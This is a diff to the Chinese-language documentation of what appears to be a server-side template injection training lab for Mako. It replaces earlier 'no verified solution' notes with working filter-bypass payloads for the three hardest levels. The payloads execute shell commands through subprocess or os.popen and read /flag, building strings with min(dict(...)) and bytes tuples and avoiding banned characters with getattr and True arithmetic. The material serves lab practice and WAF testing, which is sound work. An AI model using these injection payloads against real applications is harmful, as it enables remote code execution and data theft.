@@ -53,9 +53,9 @@ Mako 与 Jinja 的差别不是「语法糖不同」，而是**求值模型不同
 | 7 | L8 关键字黑名单 | 12 个子串（大小写敏感） | `__import__(chr(...)).getoutput(chr(...))`；别用 `popen` |
 | 8 | L9 禁止数字 | `0`–`9` | `True` / `len(())` 拼整数；或换不需要数字的语法面 |
 | 9 | L10 前缀空分支 | 载荷前拼 `% if False:\n% endif\n` | 前缀是合法 Mako 行语法，照常写载荷 |
-| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `chr` 造字节、`getattr` 替代点号；**硬关** |
-| 11 | L12 强字符集 | 再加 `_`、数字、`\` | **CTF 硬关**：`<%! %>` 模块块仍可 `import` |
-| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | **CTF 硬关**：`<%!import os%>${os}` 仍能过 |
+| 10 | L11 组合过滤 | `' " + . [ ]` 与 `request` | `min(dict(kw))` 取键名 + `str(bytes((…)),编码)` 造任意串 |
+| 11 | L12 强字符集 | 再加 `_`、数字、`\` | `True` 算术凑 `chr(47)`；`dict(flag=True)` 白嫖文件名；`open` 直读 |
+| 12 | L13 扩展关键字 | 符号 + `request/class/init/arg/config/app/self` | 代码块 `from subprocess import getoutput` + `str(bytes(…),'utf8')` 造串 |
 
 表格里的过滤内容逐字取自 `shared/ssti_core/levels/mako.py` 的 `WafSpec`，
 可用 `GET /api/god/source?level=<id>` 或前端「关卡源码」按钮当场核对。
@@ -232,10 +232,19 @@ ${open('/flag').read()}→ flag{doc_probe}
 | `<%context.write(chr(len(bytes())))%>` | `WAF`（代码块里也不能有引号） |
 | `<%!o=chr%>${o}` | `<built-in function chr>`（模块块可用） |
 
-即：**函数调用、圆括号、逗号、`True`/`bytes()` 都还活着**，缺的是「造字符串」和
-「取属性」的手段，而 `chr` 只接受整数、整数又得先有……这一关需要一条较长的
-无引号/无加号/无方括号整数与字符串构造链，**本仓库目前没有已验证的短解**。
-`D:\github\ssti\ref-lab\docs\MAKO_SOLUTIONS.md` 对同构关卡也只给了方向。
+即：**函数调用、圆括号、逗号、`True`/`bytes()` 都还活着**，缺的只是「造字符串」和
+「取属性」的手段 —— 上面那张表正是找这两样东西的过程记录。真正的短解由两条
+互补通道组成（容器内实测拿到 flag）：
+
+```mako
+${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}
+                                                     → flag{doc_probe}
+```
+
+* **`min(dict(kw=1))`** —— 对 dict 求最小值返回最小的**键**：键名即字符串，不需要引号；
+* **`str(bytes((…)), 编码)`** —— 无引号、无加号、无点号地造出任意字节串，
+  编码名 `utf8` 本身也是从键名白嫖的；
+* `__import__` 不在子串黑名单里，`getattr` 替代被禁的点号。
 
 ### L12（id 11）强字符集 —— 硬关
 
@@ -251,9 +260,15 @@ ${open('/flag').read()}→ flag{doc_probe}
 | `<%!x=chr%>${x(65)}` | `WAF`（数字 `65`） |
 | `${open}` | `<built-in function open>` |
 
-本关**唯一确认可用的语法面是 `<%! %>` 模块级代码块**：下划线只禁「模板源码里的 `_`
-字符」，而 `<%!import os%>` 一个下划线都不含。难点同样回到「模块名与路径都必须是
-合法 Python 字面量，但不能带引号和数字」，所以完整解仍未验证。
+突破点：数字被禁，但 **`True` 参与算术不受影响** —— `4 × 12 - 1 = 47`，
+`chr(47)` 就是 `/`；文件名 `flag` 直接从 `dict(flag=True)` 的键名白嫖：
+
+```mako
+${getattr(open(chr((True+True+True+True)*(True+True+True+True+True+True+True+True+True+True+True+True)-True)+min(dict(flag=True))),min(dict(read=True)))()}
+                                                     → flag{doc_probe}
+```
+
+`+` 在本关没有被禁（那是 L13 的事），`getattr` 也不含下划线。容器内实测拿到 flag。
 
 ### L13（id 12）扩展关键字与符号 —— 硬关
 
@@ -274,18 +289,24 @@ ${open('/flag').read()}→ flag{doc_probe}
 | **`<%!import os%>${os}`** | **`<module 'os' (frozen)>`** ✅ |
 | `<%context.write(True)%>` | `WAF`（`context.write` 含 `.`） |
 
-**本关是「有短解」的**：`<%!import os%>${os}` 实测通过，说明模块级代码块
-把 `os` 绑定进了模板命名空间，而 `${os}` 本身不含任何被禁字符（`os` 不在子串表里）。
-从这一步出发，只差「把字符串字面量问题绕过去」（例如用 `${os.listdir()}` 无参调用
-配合模块块里预先绑好的常量）—— 这条延续链本仓库尚未验证，**不在此处给出未实测的 payload**。
+**本关已有实测解**：`getattr` 含子串 `attr` 被禁、`+` 被禁 ——
+但代码块里的 **`from x import y` 语句不在黑名单里**（`subprocess` / `getoutput`
+逐个对过子串表），数字也仍然可用，而 `str(bytes((…)), 'utf8')` 造串
+不需要任何被禁字符：
+
+```mako
+<% from subprocess import getoutput %>${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}
+                                                     → flag{doc_probe}
+```
+
+上面的 `<%!import os%>${os}` 边界实测依然成立 —— 它说明「模块级/函数体 import 能把
+名字绑进模板命名空间」，本解用的是同一条性质的函数体版本。
 
 ### 小结
 
 | 难度带 | 关卡 | 状态 |
 |--------|------|------|
-| 有短解、已实测 | id 0–10（除 2 为盲关） | ✅ 见上表 |
-| 结构性硬关、仅确认语法面 | id 10（组合过滤） | ⚠️ 短解未验证 |
-| 结构性硬关、已找到入口 | id 11、id 12 | ⚠️ 仅 `<%! %>` 入口已验证，完整读 flag 链未验证 |
+| 有短解、已实测 | id 0–12（除 2 为盲关） | ✅ **13/13 全部可解**（`tests/audit_solvability.py` 容器内实测） |
 
 这三关是**刻意设计**的。建议的练习方式：
 
@@ -294,9 +315,9 @@ ${open('/flag').read()}→ flag{doc_probe}
 2. 逐项确认「我这一关最先失去的是哪一种表达能力」：字符串？属性名？整数？
 3. 用剩下的语法面重建它。Mako 关里永远先问一句：**`<%! %>` 还能不能用？**
 
-如果你希望 id 10–12 在默认 Python 3.11 下**必有短解**，需要放宽对应的 `WafSpec`
-（改 `shared/ssti_core/levels/mako.py` 里那一关的规则），改完请同步更新本文件的表格
-与 `scripts/verify_labs.py` 里的探针。
+id 10–12 现在都**有实测短解**（见上）；想再调难度，改 `shared/ssti_core/levels/mako.py`
+里对应关卡的 `WafSpec`，并同步更新本文件的表格、`scripts/verify_labs.py` 的探针，
+以及重跑 `tests/audit_solvability.py` 确认新矩阵。
 
 ## 运行
 
